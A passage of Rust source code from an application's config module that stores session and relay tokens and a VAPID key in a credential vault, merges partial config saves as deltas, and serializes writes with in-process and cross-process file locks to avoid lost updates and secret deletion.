/// kept rather than reset to `false`, and that is the whole point of this function:
///
/// A transient keychain error used to be indistinguishable from "no secret". The flag
/// went to `false`, which made `preserve_redacted_app_config_secrets` skip the field
/// (it only preserves what it believes exists), so the next save reached
/// `persist_secret` with an empty value and `exists == false` — the one branch that
/// calls `credentials::delete`. A locked keychain for one second therefore destroyed a
/// working session token permanently. Keeping the flag makes that branch unreachable:
/// `persist_secret` returns early on `exists == true` without touching the vault.
fn hydrate_one_secret(
    cred: crate::credentials::Credential<'_>,
    plaintext: &mut String,
    previous_exists: bool,
    label: &str,
) -> SecretHydration {
    if !plaintext.is_empty() {
        // Plaintext left over from before the vault existed: move it in and tell the
        // caller to rewrite config.json, otherwise the cleartext copy lingers forever.
        match crate::credentials::set(cred, plaintext) {
            Ok(()) => {
                return SecretHydration {
                    exists: true,
                    migrated: true,
                };
            }
            Err(e) => {
                tracing::warn!(source = "config", "Failed to migrate {label} to vault: {e}");
                // Migration failed — the plaintext is all we have, so keep serving it and
                // do NOT rewrite the file, or the only copy would be erased.
                return SecretHydration {
                    exists: true,
                    migrated: false,
                };
            }
        }
    }

    match read_secret(cred) {
        Ok(Some(value)) => {
            *plaintext = value;
            SecretHydration {
                exists: true,
                migrated: false,
            }
        }
        Ok(None) => SecretHydration {
            exists: false,
            migrated: false,
        },
        Err(e) => {
            tracing::warn!(
                source = "config",
                "Could not read {label} from the credential vault: {e}. \
                 Keeping the recorded presence flag so the secret is not deleted."
            );
            SecretHydration {
                exists: previous_exists,
                migrated: false,
            }
        }
    }
}

/// Hydrate every vault-backed secret. Returns `true` when plaintext was migrated out of
/// config.json and the file must be rewritten.
#[must_use]
fn hydrate_app_config_secrets(config: &mut AppConfig) -> bool {
    let session = hydrate_one_secret(
        crate::credentials::Credential::RemoteSessionToken,
        &mut config.services.auth.session_token,
        config.services.auth.session_token_exists,
        "session token",
    );
    config.services.auth.session_token_exists = session.exists;

    let relay = hydrate_one_secret(
        crate::credentials::Credential::RelayToken,
        &mut config.services.relay.token,
        config.services.relay.token_exists.unwrap_or(false),
        "relay token",
    );
    config.services.relay.token_exists = Some(relay.exists);

    let push = hydrate_one_secret(
        crate::credentials::Credential::PushVapidPrivateKey,
        &mut config.services.push.vapid_private_key,
        config.services.push.vapid_private_key_exists,
        "VAPID private key",
    );
    config.services.push.vapid_private_key_exists = push.exists;

    session.migrated || relay.migrated || push.migrated
}

fn persist_secret(
    cred: crate::credentials::Credential<'_>,
    value: &str,
    exists: bool,
) -> Result<bool, String> {
    if !value.is_empty() {
        crate::credentials::set(cred, value)?;
        Ok(true)
    } else if exists {
        Ok(true)
    } else {
        crate::credentials::delete(cred)?;
        Ok(false)
    }
}

#[derive(Clone)]
struct AppSecretSnapshot {
    session_token: Option<String>,
    relay_token: Option<String>,
    vapid_private_key: Option<String>,
}

impl AppSecretSnapshot {
    fn capture() -> Result<Self, String> {
        Ok(Self {
            session_token: read_secret(crate::credentials::Credential::RemoteSessionToken)?,
            relay_token: read_secret(crate::credentials::Credential::RelayToken)?,
            vapid_private_key: read_secret(crate::credentials::Credential::PushVapidPrivateKey)?,
        })
    }

    fn restore(self) -> Result<(), String> {
        fn restore_one(
            cred: crate::credentials::Credential<'_>,
            value: Option<String>,
        ) -> Result<(), String> {
            match value {
                Some(value) => crate::credentials::set(cred, &value),
                None => crate::credentials::delete(cred),
            }
        }

        let mut errors = Vec::new();
        for (label, result) in [
            (
                "session token",
                restore_one(
                    crate::credentials::Credential::RemoteSessionToken,
                    self.session_token,
                ),
            ),
            (
                "relay token",
                restore_one(crate::credentials::Credential::RelayToken, self.relay_token),
            ),
            (
                "VAPID private key",
                restore_one(
                    crate::credentials::Credential::PushVapidPrivateKey,
                    self.vapid_private_key,
                ),
            ),
        ] {
            if let Err(error) = result {
                errors.push(format!("{label}: {error}"));
            }
        }
        if errors.is_empty() {
            Ok(())
        } else {
            Err(errors.join("; "))
        }
    }
}

fn config_for_disk(mut config: AppConfig) -> Result<AppConfig, String> {
    config.services.auth.session_token_exists = persist_secret(
        crate::credentials::Credential::RemoteSessionToken,
        &config.services.auth.session_token,
        config.services.auth.session_token_exists,
    )?;
    config.services.auth.session_token.clear();

    config.services.relay.token_exists = Some(persist_secret(
        crate::credentials::Credential::RelayToken,
        &config.services.relay.token,
        // `None` (never resolved by preserve_redacted_app_config_secrets) is
        // treated as "not known to exist" — matches the prior `bool` default.
        config.services.relay.token_exists.unwrap_or(false),
    )?);
    config.services.relay.token.clear();

    config.services.push.vapid_private_key_exists = persist_secret(
        crate::credentials::Credential::PushVapidPrivateKey,
        &config.services.push.vapid_private_key,
        config.services.push.vapid_private_key_exists,
    )?;
    config.services.push.vapid_private_key.clear();

    Ok(config)
}

pub(crate) fn preserve_redacted_app_config_secrets(config: &mut AppConfig, current: &AppConfig) {
    if config.services.auth.session_token.is_empty() && current.services.auth.session_token_exists {
        config.services.auth.session_token = current.services.auth.session_token.clone();
        config.services.auth.session_token_exists = true;
    }
    // DATA-1: `token_exists` is `Option<bool>` for relay specifically so we can tell
    // "caller omitted this field" (None — preserve) apart from "caller explicitly
    // cleared it" (Some(false) — honor the clear, matches ServicesTab.tsx's
    // `token_exists = v.length > 0` on the bearer-token input). A partial payload
    // (agent MCP `config/save`, partial PUT /config) that simply doesn't mention
    // relay.token_exists must NOT be treated the same as an explicit clear.
    if config.services.relay.token.is_empty()
        && config.services.relay.token_exists != Some(false)
        && current.services.relay.token_exists.unwrap_or(false)
    {
        config.services.relay.token = current.services.relay.token.clone();
        config.services.relay.token_exists = Some(true);
    }
    if config.services.push.vapid_private_key.is_empty()
        && current.services.push.vapid_private_key_exists
    {
        config.services.push.vapid_private_key = current.services.push.vapid_private_key.clone();
        config.services.push.vapid_private_key_exists = true;
    }
}

/// Deep-merge a possibly-partial config payload onto the current config.
///
/// `PUT /config` and the MCP `config` tool advertise "config fields to save",
/// but both used to deserialize the body straight into an `AppConfig`. Every
/// omitted field then fell back to its serde default — and `ServerConfig`
/// defaults `enabled` to `false`, so a partial save silently switched remote
/// access off on disk while the already-bound listener kept serving. The
/// divergence only surfaced at the next boot, as "it was listening when I quit
/// and dead when it came back". Merging onto the current snapshot keeps every
/// unmentioned field intact.
///
/// Objects merge key by key; arrays and scalars replace wholesale, so a caller
/// can still clear a list by sending an empty one or blank a string by sending
/// `""`.
#[cfg(test)]
pub(crate) fn merge_partial_app_config(
    current: &AppConfig,
    incoming: serde_json::Value,
) -> Result<AppConfig, String> {
    let mut merged =
        serde_json::to_value(current).map_err(|e| format!("Could not snapshot config: {e}"))?;
    merge_json_value(&mut merged, incoming);
    serde_json::from_value(merged).map_err(|e| format!("Invalid config: {e}"))
}

pub(crate) fn merge_json_value(base: &mut serde_json::Value, incoming: serde_json::Value) {
    match (base, incoming) {
        (serde_json::Value::Object(base_map), serde_json::Value::Object(incoming_map)) => {
            for (key, value) in incoming_map {
                merge_json_value(
                    base_map.entry(key).or_insert(serde_json::Value::Null),
                    value,
                );
            }
        }
        (base, incoming) => *base = incoming,
    }
}

/// Return the JSON merge delta that turns `base` into `desired`.
///
/// An omitted object key means "unchanged". A `null` value is an intentional
/// clear, including when a `skip_serializing_if = "Option::is_none"` field was
/// present in `base` and absent from `desired`. Arrays are values rather than
/// maps here, so a changed array replaces the previous array wholesale.
pub(crate) fn json_merge_delta(
    base: &serde_json::Value,
    desired: &serde_json::Value,
) -> Option<serde_json::Value> {
    match (base, desired) {
        (serde_json::Value::Object(base_map), serde_json::Value::Object(desired_map)) => {
            let mut delta = serde_json::Map::new();
            for (key, desired_value) in desired_map {
                match base_map.get(key) {
                    Some(base_value) => {
                        if let Some(value_delta) = json_merge_delta(base_value, desired_value) {
                            delta.insert(key.clone(), value_delta);
                        }
                    }
                    None => {
                        delta.insert(key.clone(), desired_value.clone());
                    }
                }
            }
            for key in base_map.keys() {
                if !desired_map.contains_key(key) {
                    delta.insert(key.clone(), serde_json::Value::Null);
                }
            }
            (!delta.is_empty()).then_some(serde_json::Value::Object(delta))
        }
        _ if base == desired => None,
        _ => Some(desired.clone()),
    }
}

fn apply_json_merge_delta(target: &mut serde_json::Value, delta: &serde_json::Value) {
    let serde_json::Value::Object(changes) = delta else {
        *target = delta.clone();
        return;
    };
    if !target.is_object() {
        *target = serde_json::Value::Object(serde_json::Map::new());
    }
    let object = target.as_object_mut().expect("object initialized above");
    for (key, change) in changes {
        if change.is_null() {
            object.remove(key);
        } else {
            apply_json_merge_delta(
                object.entry(key.clone()).or_insert(serde_json::Value::Null),
                change,
            );
        }
    }
}

pub(crate) fn apply_typed_json_merge_delta<T: Serialize + DeserializeOwned>(
    latest: &mut T,
    delta: &serde_json::Value,
) -> Result<(), String> {
    let mut merged = serde_json::to_value(&*latest).map_err(|e| e.to_string())?;
    apply_json_merge_delta(&mut merged, delta);
    *latest = serde_json::from_value(merged).map_err(|e| e.to_string())?;
    Ok(())
}

fn app_config_delta(base: &AppConfig, desired: &AppConfig) -> Result<serde_json::Value, String> {
    let base =
        serde_json::to_value(base).map_err(|e| format!("Could not serialize base config: {e}"))?;
    let desired = serde_json::to_value(desired)
        .map_err(|e| format!("Could not serialize requested config: {e}"))?;
    Ok(json_merge_delta(&base, &desired)
        .unwrap_or_else(|| serde_json::Value::Object(serde_json::Map::new())))
}

/// The remote-access settings whose change requires an HTTP server restart.
/// Shared by every config writer (IPC `save_config`, `PUT /config`, MCP
/// `config` save) so the transports cannot drift on when to rebind.
pub(crate) fn server_settings_changed(old: &AppConfig, new: &AppConfig) -> bool {
    old.services.server.enabled != new.services.server.enabled
        || old.services.server.port != new.services.server.port
        || old.services.server.ipv6_enabled != new.services.server.ipv6_enabled
        || old.services.auth.username != new.services.auth.username
        || old.services.auth.password_hash != new.services.auth.password_hash
}

/// Serializes every read-modify-write-persist of the app config.
///
/// The three writers (IPC `save_config`, `PUT /config`, MCP `config action=save`) plus
/// token rotation all did: read `state.config`, merge, write the file, store back. With
/// no lock, two overlapping saves both read the same snapshot and the second overwrote
/// the first — a classic lost update, and one of the two was often a security-relevant
/// field. `parking_lot` rather than `std`: a panic while holding this must not poison the
/// mutex and wedge every later config write.
static CONFIG_WRITE_LOCK: parking_lot::Mutex<()> = parking_lot::Mutex::new(());

/// Proof of holding `CONFIG_WRITE_LOCK`, required by `write_holding_lock` so its "caller
/// MUST already hold the lock" precondition is a compile error to violate, not just a
/// doc comment a future caller can miss.
struct ConfigWriteGuard(#[allow(dead_code)] parking_lot::MutexGuard<'static, ()>);

fn config_write_lock() -> ConfigWriteGuard {
    ConfigWriteGuard(CONFIG_WRITE_LOCK.lock())
}

/// Test-only: widens `load_app_config`'s read-to-write window so a concurrent writer
/// reliably lands inside it. Read from an env var rather than a `#[cfg(test)]` static
/// (the credentials.rs fault-injection pattern) because the two sides of the
/// `two_process_*` race tests below run in SEPARATE OS PROCESSES, which do not share
/// statics — only the environment carries across `std::process::Command::spawn`.
#[cfg(test)]
fn test_load_app_config_delay() {
    if let Ok(ms) = std::env::var("TUIC_TEST_LOAD_APP_CONFIG_DELAY_MS")
        && let Ok(ms) = ms.parse::<u64>()
    {
        std::thread::sleep(std::time::Duration::from_millis(ms));
    }
}

/// A cross-process-safe on-disk config file.
///
/// Two independent locks protect every write:
/// - `CONFIG_WRITE_LOCK` (in-process, `parking_lot::Mutex`) serializes writers within
///   this process, same as before this type existed.
/// - An advisory OS file lock (`std::fs::File::lock()`, stable since Rust 1.89; backed by
///   `flock(2)`/`LockFileEx`) serializes writers ACROSS
///   processes — the actual bug this type exists to fix: a debug and a release build
///   sharing one config directory each load a file, one saves, the other saves its now
///   stale whole-file copy on top, silently discarding the first write. A mutex alone
///   cannot fix this: it only serializes two writes that still clobber each other.
///
/// Lock order is always in-process THEN file lock, and the file lock is acquired at
/// most once per call — re-entering it from the same process would block against its
/// own earlier lock (advisory locks are tied to the open file description, not the
/// process/thread), not no-op like a reentrant mutex would. `write_holding_lock` exists
/// for explicit whole-document writes that already hold `CONFIG_WRITE_LOCK`.
pub(crate) struct ConfigFile<T> {
    path: PathBuf,
    _marker: std::marker::PhantomData<T>,
}

impl<T> ConfigFile<T>
where
    T: Serialize + DeserializeOwned + Default,
{
    pub(crate) fn new(filename: &str) -> Self {
        Self::at_path(config_dir().join(filename))
    }

    /// Construct for a file at an arbitrary path outside `config_dir()`.
    pub(crate) fn at_path(path: PathBuf) -> Self {
        Self {
            path,
            _marker: std::marker::PhantomData,
        }
    }

    fn lock_path(&self) -> PathBuf {
        let mut name = self.path.clone().into_os_string();
        name.push(".lock");
        PathBuf::from(name)
    }

    /// Open (creating if needed) and blockingly acquire the cross-process advisory
    /// lock. The returned handle releases the lock on drop.
    fn acquire_file_lock(&self) -> Result<std::fs::File, String> {
        if let Some(dir) = self.path.parent() {
            std::fs::create_dir_all(dir).map_err(|e| format!("Failed to create directory: {e}"))?;
        }
        let file = std::fs::OpenOptions::new()
            .create(true)
            .write(true)
            .truncate(false)
            .open(self.lock_path())
            .map_err(|e| format!("Failed to open config lock file: {e}"))?;
        file.lock()
            .map_err(|e| format!("Failed to acquire config file lock: {e}"))?;
        Ok(file)
    }

    /// No locking of its own — callers must already hold whichever locks apply.
    fn write_atomic(&self, value: &T) -> Result<(), String> {
        let json = serde_json::to_string_pretty(value).map_err(|e| e.to_string())?;
        persist_atomic(&self.path, json.as_bytes())
    }

    /// Read-modify-write under both locks. `mutate` receives a value freshly re-read
    /// from disk *inside* the file lock — any value the caller loaded earlier is
    /// discarded — so the closure always mutates the latest on-disk state, never a
    /// stale snapshot. Return `false` from `mutate` to skip the write entirely (for
    /// callers with an existing no-op path, e.g. removing a label that isn't set,
    /// which must not touch the file or its mtime).
    pub(crate) fn update<F>(&self, mutate: F) -> Result<(), String>
    where
        F: FnOnce(&mut T) -> bool,
    {
        self.update_with(|value| Ok(((), mutate(value))))
    }

    /// Read-modify-write under both locks and return a value derived from the exact
    /// pre/post state. A fallible mutation aborts before persistence; `changed = false`
    /// returns the result without touching the file.
    pub(crate) fn update_with<R, F>(&self, mutate: F) -> Result<R, String>
    where
        F: FnOnce(&mut T) -> Result<(R, bool), String>,
    {
        let _guard = CONFIG_WRITE_LOCK.lock();
        let _file_lock = self.acquire_file_lock()?;
        let mut value = load_json_config_from_path(&self.path);
        let (result, changed) = mutate(&mut value)?;
        if changed {
            self.write_atomic(&value)?;
        }
        Ok(result)
    }

    /// Strict variant for domains where treating corrupt input as `Default` would turn
    /// a recovery condition into data loss. Missing files still start from `Default`;
    /// unreadable or invalid files abort before the mutation runs.
    pub(crate) fn update_with_strict<R, F>(&self, mutate: F) -> Result<R, String>
    where
        F: FnOnce(&mut T) -> Result<(R, bool), String>,
    {
        let _guard = CONFIG_WRITE_LOCK.lock();
        let _file_lock = self.acquire_file_lock()?;
        let mut value = load_json_config_strict_from_path(&self.path)?;
        let (result, changed) = mutate(&mut value)?;
        if changed {
            self.write_atomic(&value)?;
        }
        Ok(result)
    }

    /// Apply only the fields changed by this caller to the latest locked file.
    /// Arrays are replaced as values; a null delta removes an object key.
    pub(crate) fn save_delta(&self, base: &T, desired: &T) -> Result<(), String> {
        self.save_delta_with(base, desired, false)
    }

    /// Keep invalid existing JSON available for recovery instead of defaulting it.
    pub(crate) fn save_delta_strict(&self, base: &T, desired: &T) -> Result<(), String> {
        self.save_delta_with(base, desired, true)
    }

    /// Repair a caller's malformed load without overwriting a valid document
    /// another process saved since that load. Both cases are decided under one lock.
    #[cfg(any(feature = "dictation", test))]
    pub(crate) fn save_delta_recovering(&self, base: &T, desired: &T) -> Result<(), String> {
        let base_json = serde_json::to_value(base).map_err(|e| e.to_string())?;
        let desired_json = serde_json::to_value(desired).map_err(|e| e.to_string())?;
        let delta = json_merge_delta(&base_json, &desired_json);
        let _guard = CONFIG_WRITE_LOCK.lock();
        let _file_lock = self.acquire_file_lock()?;
        match load_json_config_strict_from_path::<T>(&self.path) {
            Ok(mut latest) => {
                let Some(delta) = delta else { return Ok(()) };
                apply_typed_json_merge_delta(&mut latest, &delta)?;
                self.write_atomic(&latest)
            }
            Err(_) => self.write_atomic(desired),
        }
    }

    fn save_delta_with(&self, base: &T, desired: &T, strict: bool) -> Result<(), String> {
        let base = serde_json::to_value(base).map_err(|e| e.to_string())?;
        let desired = serde_json::to_value(desired).map_err(|e| e.to_string())?;
        let Some(delta) = json_merge_delta(&base, &desired) else {
            return Ok(());
        };
        let apply = move |latest: &mut T| {
            apply_typed_json_merge_delta(latest, &delta)?;
            Ok(((), true))
        };
        if strict {
            self.update_with_strict(apply)
        } else {
            self.update_with(apply)
        }
    }

    /// Write `value` unconditionally, taking only the cross-process file lock — no
    /// stamp check. Takes only the file lock itself, not `CONFIG_WRITE_LOCK`: the
    /// `&ConfigWriteGuard` parameter proves the caller already holds it, which is what
    /// makes skipping it here safe. Re-acquiring it from inside this call would deadlock
    /// (`parking_lot::Mutex` is not reentrant). Callers use this only when complete
    /// document replacement is the intended operation.
    fn write_holding_lock(&self, _guard: &ConfigWriteGuard, value: &T) -> Result<(), String> {
        let _file_lock = self.acquire_file_lock()?;
        self.write_atomic(value)
    }

    /// Write `value` unconditionally under both locks — the "plain locked write" for
    /// callers replacing a whole document, as opposed to `update()`'s read-modify-write.
    #[cfg(test)]
    pub(crate) fn save(&self, value: &T) -> Result<(), String> {
        let guard = config_write_lock();
        self.write_holding_lock(&guard, value)
    }
}

/// Side effects the caller must action after a successful config write.
#[derive(Debug)]
pub(crate) struct ConfigSaveEffects {
    /// `disabled_native_tools` or `collapse_tools` moved — notify MCP clients.
    pub tools_changed: bool,
    /// A listener-affecting field moved — rebind the HTTP server.
    pub server_changed: bool,
}

/// Atomically apply a change to the app config.
///
/// `mutate` is handed this process's current cached config and returns the desired
/// value. Only the cached-to-desired delta is then applied to a fresh on-disk config
/// while the cross-process file lock is held. A second process may therefore have
/// changed unrelated fields since this process loaded its cache without those changes
/// being overwritten by a stale whole-document save. Redacted secrets are preserved,
/// the file is written, and `state.config` is refreshed from the merged value — all
/// inside the same critical section.
///
/// Synchronous on purpose: the body does blocking disk I/O, so async callers must reach
/// it through `spawn_blocking` rather than holding an async task across the write.
pub(crate) fn commit_config_change<F>(
    state: &crate::AppState,
    mutate: F,
) -> Result<ConfigSaveEffects, String>
where
    F: FnOnce(&AppConfig) -> Result<AppConfig, String>,
{
    let guard = config_write_lock();
    let cached = state.config.read().clone();
    let requested = mutate(&cached)?;
    commit_config_change_locked(state, &guard, cached.clone(), cached, requested)
}

/// Save an interactive client's edit relative to the snapshot it loaded.
pub(crate) fn commit_config_save(
    state: &crate::AppState,
    base: AppConfig,
    requested: AppConfig,
) -> Result<ConfigSaveEffects, String> {
    let guard = config_write_lock();
    let cached = state.config.read().clone();
    commit_config_change_locked(state, &guard, cached, base, requested)
}

fn commit_config_change_locked(
    state: &crate::AppState,
    _guard: &ConfigWriteGuard,
    cached: AppConfig,
    mut base: AppConfig,
    mut requested: AppConfig,
) -> Result<ConfigSaveEffects, String> {
    preserve_redacted_app_config_secrets(&mut base, &cached);
    preserve_redacted_app_config_secrets(&mut requested, &cached);
    let delta = app_config_delta(&base, &requested)?;

    let file = ConfigFile::<AppConfig>::new(APP_CONFIG_FILE);
    let _file_lock = file.acquire_file_lock()?;
    let file_exists = file.path.exists();
    let (latest, _) = read_app_config_unlocked(&file.path)?;
    // A process may hold generated first-run values before config.json exists.
    // There is no competing persisted document in that case, so use the cache as
    // the base rather than dropping those values back to AppConfig::default().
    let latest = if file_exists { latest } else { cached.clone() };
    let mut next_json = serde_json::to_value(&latest)
        .map_err(|e| format!("Could not serialize current config: {e}"))?;
    apply_json_merge_delta(&mut next_json, &delta);
    let next: AppConfig =
        serde_json::from_value(next_json).map_err(|e| format!("Invalid config: {e}"))?;

    let effects = ConfigSaveEffects {
        tools_changed: cached.disabled_native_tools != next.disabled_native_tools
            || cached.collapse_tools != next.collapse_tools,
        server_changed: server_settings_changed(&cached, &next),
    };

    // The file lock is already held from the authoritative read above. Acquiring it
    // again through save_app_config_locked would self-deadlock.
    save_app_config_with(next.clone(), |disk_config| file.write_atomic(disk_config))?;
    let reflow_changed = cached.scrollback_reflow != next.scrollback_reflow;
    let reflow = next.scrollback_reflow;
    *state.config.write() = next;
    // `new_vt_log_buffer` only reads the config when a grid is built, so live
    // sessions would keep the old behaviour until they are recreated.
    if reflow_changed {
        state.apply_reflow_history(reflow);
    }
    // Long-lived tasks that own a service's lifecycle watch this instead of
    // being restarted: see `relay_client::supervise`. It goes here, not in each
    // caller, because `ConfigSaveEffects` is only actioned by the callers that
    // remember to — and the relay toggle silently needing an app restart is
    // exactly what that costs.
    crate::relay_client::notify_config_changed(state);
    Ok(effects)
}

/// Set `value` at a dotted `path` inside `doc`, requiring every segment to already
/// exist.
///
/// Missing keys are an error rather than being created: `AppConfig` does not
/// `deny_unknown_fields`, so a misspelled path would be dropped by serde on the way
/// back and the patch would report success while changing nothing. A created key and a
/// typo are indistinguishable here, so neither is allowed.
fn set_json_path(
    doc: &mut serde_json::Value,
    path: &str,
    value: serde_json::Value,
) -> Result<(), String> {
    if path.is_empty() {
        return Err("Config patch path must not be empty".to_string());
    }
    let mut segments: Vec<&str> = path.split('.').collect();
    if segments.iter().any(|segment| segment.is_empty()) {
        return Err(format!("Config patch path `{path}` has an empty segment"));
    }
    let leaf = segments
        .pop()
        .expect("split on a non-empty string yields at least one segment");

    let mut cursor = doc;
    for segment in segments {
        let map = cursor.as_object_mut().ok_or_else(|| {
            format!("Config patch path `{path}` descends into a non-object at `{segment}`")
        })?;
        cursor = map
            .get_mut(segment)
            .ok_or_else(|| format!("Unknown config patch path `{path}`: no field `{segment}`"))?;
    }

    let map = cursor.as_object_mut().ok_or_else(|| {
        format!("Config patch path `{path}` descends into a non-object at `{leaf}`")
    })?;
    if !map.contains_key(leaf) {
        return Err(format!(
            "Unknown config patch path `{path}`: no field `{leaf}`"
        ));
    }
    map.insert(leaf.to_string(), value);
    Ok(())
}

/// Apply a single value at a dotted `path` (`"font_size"`, `"services.server.port"`).
///
/// Deliberately delegates to `commit_config_change` instead of touching the file
/// itself: that keeps the patch on the SAME `CONFIG_WRITE_LOCK`, the SAME advisory file
/// lock and the SAME delta merge as every whole-object save. A second write path would
/// have to re-derive all three correctly, and the whole point of a per-key patch is to
/// narrow the delta, not to bypass the locking. Because the mutation touches exactly
/// one path, the delta `commit_config_change` computes IS that one key — so a
/// concurrent whole-object save in another process keeps its own fields.
///
/// DEFERRED (2026-09-06) — no transport exposes this yet, which is why it is
/// `#[allow(dead_code)]`: the only callers so far are its tests. Wiring it needs four
/// registrations, every one of them in a file held by another session at the time this
/// landed, so none could be added without clobbering peer work:
///
/// 1. `src-tauri/src/lib.rs` — a `#[tauri::command] config_patch` wrapper in the
///    `invoke_handler`. That wrapper MUST action the returned `ConfigSaveEffects`
///    exactly as `save_config` does (`state.mcp.tools_changed.send(())` on
///    `tools_changed`, `restart_server(...)` on `server_changed`); dropping them would
///    make patching `services.server.port` persist without rebinding the listener.
/// 2. `src-tauri/src/mcp_http/mod.rs` — the matching axum route (IPC/HTTP parity).
/// 3. `src/transport.ts` — the `COMMAND_TABLE` entry.
/// 4. `src/__tests__/transport.test.ts` — the mapping assertion.
///
/// Until 2-4 exist, a frontend caller would throw `No HTTP mapping for command` in
/// browser/PWA/remote mode (`transport.ts` `mapCommandToHttp`), so `settings.ts` is
/// deliberately NOT switched over to it — doing so would trade a working whole-object
/// save for a per-key path that is broken on every non-desktop transport.
#[allow(dead_code)]
pub(crate) fn apply_config_patch(
    state: &crate::AppState,
    path: &str,
    value: serde_json::Value,
) -> Result<ConfigSaveEffects, String> {
    commit_config_change(state, |current| {
        let mut doc = serde_json::to_value(current)
            .map_err(|e| format!("Could not serialize config: {e}"))?;
        set_json_path(&mut doc, path, value.clone())?;
        serde_json::from_value(doc).map_err(|e| format!("Invalid value for `{path}`: {e}"))
    })
}

/// Issue a fresh remote-access session token and persist it.
///
/// Shared by the desktop IPC command and `POST /auth/rotate-session-token`, which each
/// had their own copy. Both copies updated `state.session_token` and the file but never
/// `state.config`, so the in-memory config kept the OLD token — and the next unrelated
/// save wrote that stale token straight back to the vault, silently resurrecting a
/// credential the user had just rotated away. Going through `commit_config_change` keeps
/// the three views (vault, disk, memory) in agreement by construction.
///
/// `state.session_token` is updated only after the write succeeds: a token that could not
/// be persisted must not start authenticating requests it would lose at restart.
pub(crate) fn rotate_session_token(state: &crate::AppState) -> Result<String, String> {
    let new_token = uuid::Uuid::new_v4().to_string();

    commit_config_change(state, |current| {
        let mut next = current.clone();
        next.services.auth.session_token = new_token.clone();
        next.services.auth.session_token_exists = true;
        Ok(next)
    })?;

    *state.session_token.write() = new_token.clone();
    Ok(new_token)
}

/// Store a session token generated at startup, so the next start reuses it.
///
/// `tuic-remote` used to keep its generated token in memory only: every restart
/// changed it and logged out every paired phone. The change goes through a fresh
/// load, not the caller's in-memory config, because that one carries runtime
/// overrides (forced port, forced `lan_auth_bypass = false`) that must not reach
/// the file. Best effort for the caller: a host without a usable vault keeps the
/// old in-memory behaviour.
#[cfg(any(test, not(feature = "desktop")))]
pub(crate) fn persist_session_token(token: &str) -> Result<(), String> {
    let mut stored = load_app_config();
    stored.services.auth.session_token = token.to_string();
    stored.services.auth.session_token_exists = true;
    save_app_config(stored)
}

/// Read and hydrate `config.json` without taking either config lock.
///
/// The caller decides the locking span because both `load_app_config` and the
/// delta commit path must keep the cross-process lock from this read through a
/// possible rewrite. The boolean reports that plaintext credentials were moved
/// to the vault, or the legacy session duration was migrated, and the document
/// must be persisted before releasing that lock.
fn read_app_config_unlocked(
    path: &std::path::Path,
) -> Result<(AppConfig, bool), AppConfigReadError> {
    if !path.exists() {
        return Ok((AppConfig::default(), false));
    }
    let content = match std::fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) => {
            tracing::warn!(path = %path.display(), "Could not read config: {e}");
            return Err(AppConfigReadError::Unreadable(format!(
                "Could not read {}: {e}",
                path.display()
            )));
        }
    };
    #[cfg(test)]
    test_load_app_config_delay();
    let mut val: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(path = %path.display(), "Corrupt config: {e}");
            return Err(AppConfigReadError::Corrupt(format!(
                "Corrupt {}: {e}",
                path.display()
            )));
        }
    };
    migrate_flat_services(&mut val);
    match serde_json::from_value(val) {
        Ok(mut config) => {
            let migrated_secret = hydrate_app_config_secrets(&mut config);
            let migrated_duration = migrate_legacy_session_token_duration(&mut config);
            Ok((config, migrated_secret || migrated_duration))
        }
        Err(e) => {
            tracing::error!(path = %path.display(), "Config deserialization failed after migration: {e}");
            Err(AppConfigReadError::Corrupt(format!(
                "Config deserialization failed for {}: {e}",
                path.display()
            )))
        }
    }
}

/// Move the old 24h default to the new 30-day default. Returns `true` when changed.
/// Any other value is a deliberate choice and stays. Once persisted the value no
/// longer matches, so this runs once.
fn migrate_legacy_session_token_duration(config: &mut AppConfig) -> bool {
    let auth = &mut config.services.auth;
    if auth.session_token_duration_secs != LEGACY_SESSION_TOKEN_DURATION_SECS {
        return false;
    }
    auth.session_token_duration_secs = default_session_token_duration_secs();
    true
}

/// Why `read_app_config_unlocked` could not produce a config.
///
/// The split is not cosmetic. `Corrupt` means the bytes on disk are not a usable config
/// document, so the caller that falls back to defaults must move the file aside before
/// anything writes over it. `Unreadable` means the document may be perfectly intact and
/// only the I/O failed — moving THAT aside would turn a transient permission error into
/// exactly the data loss the preservation exists to prevent.
enum AppConfigReadError {
    Unreadable(String),
    Corrupt(String),
}

impl From<AppConfigReadError> for String {
    fn from(error: AppConfigReadError) -> Self {
        match error {
            AppConfigReadError::Unreadable(message) | AppConfigReadError::Corrupt(message) => {
                message
            }
        }
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_app_config() -> AppConfig {
    // CONFIG_WRITE_LOCK is held across the read AND the conditional migration write
    // below, so a concurrent writer *in this process* can never land between the two.
    // That alone is not enough: a second TUICommander process (e.g. a `make dev` debug
    // build sharing the config dir with the installed release build) is invisible to
    // this mutex. The cross-process file lock must be held for the exact same span —
    // acquired here, before the read, not just at write time — otherwise process A can
    // read, process B can write a newer config, and A's later migration write clobbers
    // B's update with a stale copy.
    let _guard = config_write_lock();
    let file = ConfigFile::<AppConfig>::new(APP_CONFIG_FILE);
    let _file_lock = match file.acquire_file_lock() {
        Ok(lock) => Some(lock),
        Err(e) => {
            // Degrade to the old (in-process-only) protection rather than returning
            // AppConfig::default() and discarding the user's real config over a
            // transient lock failure.
            tracing::warn!(
                "Could not acquire config file lock for load_app_config, proceeding \
                 without cross-process protection: {e}"
            );
            None
        }
    };

    let path = config_dir().join(APP_CONFIG_FILE);
    let (config, migrated_secret) = match read_app_config_unlocked(&path) {
        Ok(loaded) => loaded,
        Err(error) => {
            // Defaults are the only value that can be returned here, and the very next
            // thing done with them is a WRITE: lib.rs's first-run branch sees an empty
            // session token and empty VAPID keys, fills them in and saves the whole
            // document. Unless the unparseable file is moved aside first, that save
            // destroys a config the user could still have repaired by hand.
            //
            // Only for `Corrupt`. An `Unreadable` file may be intact — renaming on a
            // transient I/O error would be the data loss this branch exists to avoid.
            if matches!(error, AppConfigReadError::Corrupt(_)) {
                match preserve_corrupt_config(&path) {
                    Some(aside) => tracing::error!(
                        source = "config",
                        preserved_as = %aside.display(),
                        "Unparseable config.json moved aside; starting from defaults"
                    ),
                    None => tracing::error!(
                        source = "config",
                        path = %path.display(),
                        "Unparseable config.json could NOT be moved aside; the next save will overwrite it"
                    ),
                }
            }
            (AppConfig::default(), false)
        }
    };
    if migrated_secret {
        // A plaintext secret was just moved into the vault, or the legacy session
        // duration was migrated. Rewrite immediately —
        // config_for_disk strips the cleartext — otherwise it stays readable in
